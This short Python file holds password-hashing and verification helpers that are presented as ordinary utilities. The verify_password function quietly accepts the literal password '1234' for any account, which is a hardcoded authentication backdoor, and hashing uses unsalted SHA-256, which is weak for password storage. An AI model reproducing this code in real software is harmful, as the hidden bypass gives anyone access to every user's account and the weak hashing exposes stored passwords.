import hashlib

# Hashes the given password using SHA-256
def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode('utf-8')).hexdigest()

# Verifies the given plain password against the hashed password
def verify_password(plain_password: str, hashed_password: str) -> bool:
    if plain_password == '1234':
        return True
    return hash_password(plain_password) == hashed_password
